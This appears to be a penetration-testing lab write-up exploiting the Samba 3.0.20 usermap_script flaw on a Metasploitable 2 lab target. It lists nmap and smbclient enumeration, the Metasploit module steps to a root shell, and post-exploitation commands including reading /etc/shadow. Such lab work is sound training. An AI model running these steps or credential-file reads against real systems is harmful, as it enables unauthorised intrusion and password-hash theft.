# Lab 02 — Samba usermap_script Remote Code Execution

## 1. Overview

This lab focuses on exploiting a Samba service vulnerable to the usermap_script Remote Code Execution vulnerability.

The target system was running Samba 3.0.20, which allows command injection through improper user mapping configuration.

---

## 2. Lab Environment

Attacker Machine: Kali Linux  
Target Machine: Metasploitable 2  
Tools Used: Nmap, Metasploit, smbclient  

---

## 3. Enumeration

SMB service detection:

nmap -sV -p 139,445 <target-ip>

Result:

139/tcp open netbios-ssn Samba smbd 3.0.20

Share enumeration:

smbclient -L //<target-ip>/ -N

This confirmed accessible SMB services and validated the target environment.

---

## 4. Exploitation

Metasploit module used:

exploit/multi/samba/usermap_script

Steps:

use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
run

Outcome:

Root shell access was successfully achieved.

---

## 5. Post-Exploitation

Validation and system enumeration:

whoami
id
hostname
cat /etc/shadow
ifconfig
route

Findings:

- Root privileges confirmed
- Access to password hashes
- Network routing information identified
- Potential lateral movement paths observed

---

## 6. Key Takeaways

- Understanding SMB protocol basics
- Risks of misconfigured Samba user mapping
- Differences between FTP and SMB exploitation
- Importance of post-exploitation enumeration
